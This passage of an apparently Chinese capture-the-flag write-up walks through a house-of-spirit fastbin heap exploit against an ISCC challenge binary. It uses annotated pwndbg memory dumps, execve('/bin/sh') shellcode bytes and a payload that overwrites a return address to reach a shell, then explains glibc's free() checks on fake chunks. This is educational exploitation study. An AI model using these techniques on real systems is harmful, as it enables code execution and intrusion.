class="line"><span class="number">0x7fffffffdc98</span>: <span class="number">0x0000000000400824</span>  <span class="number">0x000000000000000e</span></span><br><span class="line"><span class="number">0x7fffffffdca8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007fffffffdcd0</span></span><br><span class="line"><span class="number">0x7fffffffdcb8</span>: <span class="number">0x00000000004009e0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcc8</span>: <span class="number">0x00007ffff7ffe168</span>  <span class="number">0x00007fffffffdd20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">#payload更改的内容：</span></span><br><span class="line"><span class="number">0x7fffffffdcd8</span>: <span class="number">0x0000000000400a8c</span>  <span class="number">0x69622fbb48f63100</span> #shellcode_start</span><br><span class="line">    								<span class="meta">#buf从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdce8</span>: <span class="number">0x54535668732f2f6e</span>	<span class="number">0x050fd231583b6a5f</span> #shellcode_end</span><br><span class="line"><span class="number">0x7fffffffdcf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd08</span>: <span class="number">0x0000000000000041</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">    								#输入的id内容</span><br><span class="line">									#此内容所在的地址为：<span class="number">0x7fffffffdd10</span></span><br><span class="line"><span class="number">0x7fffffffdd18</span>: <span class="number">0x00007fffffffdd10</span>  <span class="number">0x00007fffffffdd80</span></span><br><span class="line">    			<span class="meta">#ptr现在被修改为指向NULL</span></span><br><span class="line">    			#由于原来ptr指向的地址为<span class="number">0x7fffffffdd10</span></span><br><span class="line">    			#因此fastbin中的chunk地址为：<span class="number">0x7fffffffdd00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">0x7fffffffdd28</span>: <span class="number">0x0000000000400b34</span>  <span class="number">0x00007ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007ffff7fdc700</span>  <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x00000000000001c8</span>  <span class="number">0x6161616161616161</span></span><br><span class="line">    			#输入的id大小		 <span class="meta">#name从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd68</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x00007fffffffdda0</span></span><br><span class="line">    								<span class="meta">#printf会泄露的内容：&amp;rbp</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>: <span class="number">0x0000000000400b59</span>  <span class="number">0x00007fffffffde88</span></span><br><span class="line"><span class="number">0x7fffffffdd98</span>: <span class="number">0x0000000100000000</span>  <span class="number">0x0000000000400b60</span></span><br><span class="line">    								<span class="meta">#rbp，内容所在的地址为：0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda8</span>: <span class="number">0x00007ffff7a2d840</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">    			#d840是main函数的返回地址</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="number">0x00007fffffffde88</span>  <span class="number">0x00000001f7ffcca0</span></span><br><span class="line"><span class="number">0x7fffffffddc8</span>: <span class="number">0x0000000000400b36</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd8</span>: <span class="number">0x35e7fe72fd004534</span>  <span class="number">0x00000000004006b0</span></span><br><span class="line"><span class="number">0x7fffffffdde8</span>: <span class="number">0x00007fffffffde80</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0xca18010d50a04534</span></span><br><span class="line"><span class="number">0x7fffffffde08</span>: <span class="number">0xca1811b744304534</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde18</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h4 id="执行登录操作"><a href="#执行登录操作" class="headerlink" title="执行登录操作"></a>执行登录操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkin(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(reg_RBP - <span class="number">0xc0</span> + <span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>Checkin 中的 malloc，由于 fastbin=0x7fffffffdd00，因此 malloc 后 ptr=0x7fffffffdd10<br>执行 malloc 之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#释放fastbin中刚才回收的chunk，结果如下：</span><br><span class="line">#&amp;rbp<span class="number">-90</span>==<span class="number">0x7fffffffdd10</span></span><br><span class="line">pwndbg&gt;  x/<span class="number">50</span>gx <span class="number">0x7fffffffdc98</span></span><br><span class="line"><span class="number">0x7fffffffdc98</span>: <span class="number">0x0000000000400824</span>  <span class="number">0x000000000000000e</span></span><br><span class="line"><span class="number">0x7fffffffdca8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007fffffffdcd0</span></span><br><span class="line"><span class="number">0x7fffffffdcb8</span>: <span class="number">0x00000000004009e0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcc8</span>: <span class="number">0x00007ffff7ffe168</span>  <span class="number">0x00007fffffffdd20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">#payload更改的内容：</span></span><br><span class="line"><span class="number">0x7fffffffdcd8</span>: <span class="number">0x0000000000400a8c</span>  <span class="number">0x69622fbb48f63100</span> #shellcode_start</span><br><span class="line">    								<span class="meta">#buf从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdce8</span>: <span class="number">0x54535668732f2f6e</span>	<span class="number">0x050fd231583b6a5f</span> #shellcode_end</span><br><span class="line"><span class="number">0x7fffffffdcf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd08</span>: <span class="number">0x0000000000000041</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">    								#输入的id内容</span><br><span class="line">									#此内容所在的地址为：<span class="number">0x7fffffffdd10</span></span><br><span class="line"><span class="number">0x7fffffffdd18</span>: <span class="number">0x00007fffffffdd10</span>  <span class="number">0x00007fffffffdd80</span></span><br><span class="line">    			<span class="meta">#ptr现在被修改为指向0x7fffffffdd10</span></span><br><span class="line">    			#malloc_chunk地址为：<span class="number">0x7fffffffdd00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">0x7fffffffdd28</span>: <span class="number">0x0000000000400b34</span>  <span class="number">0x00007ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007ffff7fdc700</span>  <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x00000000000001c8</span>  <span class="number">0x6161616161616161</span></span><br><span class="line">    			#输入的id大小		 <span class="meta">#name从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd68</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x00007fffffffdda0</span></span><br><span class="line">    								<span class="meta">#printf会泄露的内容：&amp;rbp</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>: <span class="number">0x0000000000400b59</span>  <span class="number">0x00007fffffffde88</span></span><br><span class="line"><span class="number">0x7fffffffdd98</span>: <span class="number">0x0000000100000000</span>  <span class="number">0x0000000000400b60</span></span><br><span class="line">    								<span class="meta">#rbp，内容所在的地址为：0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda8</span>: <span class="number">0x00007ffff7a2d840</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">    			#d840是main函数的返回地址</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="number">0x00007fffffffde88</span>  <span class="number">0x00000001f7ffcca0</span></span><br><span class="line"><span class="number">0x7fffffffddc8</span>: <span class="number">0x0000000000400b36</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd8</span>: <span class="number">0x35e7fe72fd004534</span>  <span class="number">0x00000000004006b0</span></span><br><span class="line"><span class="number">0x7fffffffdde8</span>: <span class="number">0x00007fffffffde80</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0xca18010d50a04534</span></span><br><span class="line"><span class="number">0x7fffffffde08</span>: <span class="number">0xca1811b744304534</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde18</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#写入payload所执行的内容p64(<span class="number">0</span>)*<span class="number">3</span>+p64(reg_RBP - <span class="number">0xc0</span> + <span class="number">1</span>)，结果如下：</span><br><span class="line">#&amp;rbp<span class="number">-90</span>==<span class="number">0x7fffffffdd10</span></span><br><span class="line">#&amp;rbp<span class="number">-0xc0</span>+<span class="number">1</span>==<span class="number">0x7fffffffdce1</span></span><br><span class="line">pwndbg&gt;  x/<span class="number">50</span>gx <span class="number">0x7fffffffdc98</span></span><br><span class="line"><span class="number">0x7fffffffdc98</span>: <span class="number">0x0000000000400824</span>  <span class="number">0x000000000000000e</span></span><br><span class="line"><span class="number">0x7fffffffdca8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007fffffffdcd0</span></span><br><span class="line"><span class="number">0x7fffffffdcb8</span>: <span class="number">0x00000000004009e0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcc8</span>: <span class="number">0x00007ffff7ffe168</span>  <span class="number">0x00007fffffffdd20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">#payload更改的内容：</span></span><br><span class="line"><span class="number">0x7fffffffdcd8</span>: <span class="number">0x0000000000400a8c</span>  <span class="number">0x69622fbb48f63100</span> #shellcode_start</span><br><span class="line">    								<span class="meta">#buf从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdce8</span>: <span class="number">0x54535668732f2f6e</span>	<span class="number">0x050fd231583b6a5f</span> #shellcode_end</span><br><span class="line"><span class="number">0x7fffffffdcf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd08</span>: <span class="number">0x0000000000000041</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">    								#输入的id内容</span><br><span class="line">									#此内容所在的地址为：<span class="number">0x7fffffffdd10</span></span><br><span class="line">    			<span class="meta">#ptr现在被修改为指向0x7fffffffdd10</span></span><br><span class="line">    			#malloc_chunk地址为：<span class="number">0x7fffffffdd00</span></span><br><span class="line"><span class="number">0x7fffffffdd18</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">0x7fffffffdd28</span>: <span class="number">0x00007fffffffdce1</span>  <span class="number">0x00007ffff7dd18e0</span></span><br><span class="line">    			#现在已被覆盖为shellcode地址</span><br><span class="line">#<span class="number">0x7fffffffdd28</span>: <span class="number">0x0000000000400b34</span>  <span class="number">0x00007ffff7dd18e0</span>（原内容）</span><br><span class="line">#.text:<span class="number">0000000000400B</span>2A                 mov     eax, <span class="number">0</span></span><br><span class="line">#.text:<span class="number">0000000000400B</span>2F                 call    sub_400A29</span><br><span class="line">#.text:<span class="number">0000000000400B</span>34                 leave #被覆盖为shellcode</span><br><span class="line">#.text:<span class="number">0000000000400B</span>35                 retn</span><br><span class="line"></span><br><span class="line">#修改的是这个函数的leave</span><br><span class="line"><span class="meta">#int sub_400A8E()</span></span><br><span class="line">#&#123;</span><br><span class="line"><span class="meta">#  signed __int64 i; <span class="comment">// [rsp+10h] [rbp-40h]</span></span></span><br><span class="line"><span class="meta">#  char v2[48]; <span class="comment">// [rsp+20h] [rbp-30h]</span></span></span><br><span class="line">#</span><br><span class="line"><span class="meta">#  puts(<span class="meta-string">&quot;who are u?&quot;</span>);</span></span><br><span class="line"><span class="meta">#  for ( i = 0LL; i &lt;= 47; ++i )</span></span><br><span class="line">#  &#123;</span><br><span class="line"><span class="meta">#    read(0, &amp;v2[i], 1uLL);</span></span><br><span class="line"><span class="meta">#    <span class="meta-keyword">if</span> ( v2[i] == 10 )</span></span><br><span class="line">#   &#123;</span><br><span class="line">#     v2[i] = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#     break;</span></span><br><span class="line">#   &#125;</span><br><span class="line"># &#125;</span><br><span class="line"><span class="meta"># printf(<span class="meta-string">&quot;%s, welcome to ISCC~ \n&quot;</span>, v2);</span></span><br><span class="line"><span class="meta"># puts(<span class="meta-string">&quot;give me your id ~~?&quot;</span>);</span></span><br><span class="line"># sub_4007DF();</span><br><span class="line"># sub_400A29();</span><br><span class="line">#&#125;</span><br><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007ffff7fdc700</span>  <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x00000000000001c8</span>  <span class="number">0x6161616161616161</span></span><br><span class="line">    			#输入的id大小	     <span class="meta">#name从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd68</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x00007fffffffdda0</span></span><br><span class="line">    								<span class="meta">#printf会泄露的内容：&amp;rbp</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>: <span class="number">0x0000000000400b59</span>  <span class="number">0x00007fffffffde88</span></span><br><span class="line"><span class="number">0x7fffffffdd98</span>: <span class="number">0x0000000100000000</span>  <span class="number">0x0000000000400b60</span></span><br><span class="line">    								<span class="meta">#rbp，内容所在的地址为：0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda8</span>: <span class="number">0x00007ffff7a2d840</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">    			#d840是main函数的返回地址</span><br><span class="line"><span class="number">0x7fffffffddb8</span>: <span class="number">0x00007fffffffde88</span>  <span class="number">0x00000001f7ffcca0</span></span><br><span class="line"><span class="number">0x7fffffffddc8</span>: <span class="number">0x0000000000400b36</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd8</span>: <span class="number">0x35e7fe72fd004534</span>  <span class="number">0x00000000004006b0</span></span><br><span class="line"><span class="number">0x7fffffffdde8</span>: <span class="number">0x00007fffffffde80</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddf8</span>: <span class="number">0x0000000000000000</span>  <span class="number">0xca18010d50a04534</span></span><br><span class="line"><span class="number">0x7fffffffde08</span>: <span class="number">0xca1811b744304534</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde18</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>程序退出时就可以执行 shellcode 从而 getshell。</p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>好了，现在可以 getshell 了，但是我们要思考一个问题，这道题是如何使用 house of spirit 这种攻击方式的？<br>其实上面某些关键地址的内存并不准确（之前也提到过），比如下面这个地方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007ffff7fdc700</span>  <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x00000000000001c8</span>  <span class="number">0x6161616161616161</span></span><br><span class="line">    			#显示不准确的地方	   <span class="meta">#name从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>

<p>其实 payload 执行时正确的内存为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007ffff7fdc700</span>  <span class="number">0x0000000000000003</span></span><br><span class="line">    								#next_prev_size</span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x000000000000001f</span>  <span class="number">0x6161616161616161</span></span><br><span class="line">    			#next_size字段       #next_malloc_data</span><br><span class="line">    			#更改的地方	         <span class="meta">#name从这里开始</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>

<p>这个地方有什么用呢？<br>答：是为了伪造<code>next chunk size</code>，目的是让后面的<code>fake chunk</code>能够顺利 free 掉。<br>回顾一下 house of spirit 的核心思想：</p>
<blockquote>
<p>（<a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/#house-of-spirit">https://wiki.x10sec.org/pwn/heap/fastbin_attack/#house-of-spirit</a>）</p>
</blockquote>
<p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。<br>该技术的核心在于在目标位置处<strong>伪造 fastbin chunk</strong>，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。<br>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。<br>首先来看第一条：fake chunk 的 ISMMAP 位不能为 1<br>由于我们伪造的 fake chunk 的 size 为 0x41，将其写成二进制的形式为 1000001，再根据下面这张图就知道绕过了检测一。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603775985689-f81bf21b-f178-47c1-bbc6-d2929891890e.png#align=left&display=inline&height=443&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=837&size=26274&status=done&style=none&width=837" alt="image.png"><br>第二条：fake chunk 地址需要对齐， MALLOC_ALIGN_MASK。fake chunk 的地址已经对齐，这里不再说。<br>第三条：已满足，不再说。<br>第四条：fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。<br><strong>在 32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8</strong>。next_chunk 大小为 1f（十进制：31），同时也小于 system_mem。<br>第五条：fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。已满足。</p>
<h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><p>在这道题目中为什么要伪造 fastbin_chunk?是因为所有的溢出均无法覆盖到有效的地址（return to shellcode），因此我们需要伪造一个 fastibin_chunk 回收到 fastbin 链中再释放从而控制更大范围的内存空间。在其中要注意伪造 fake_fastbin_chunk 的条件。</p>
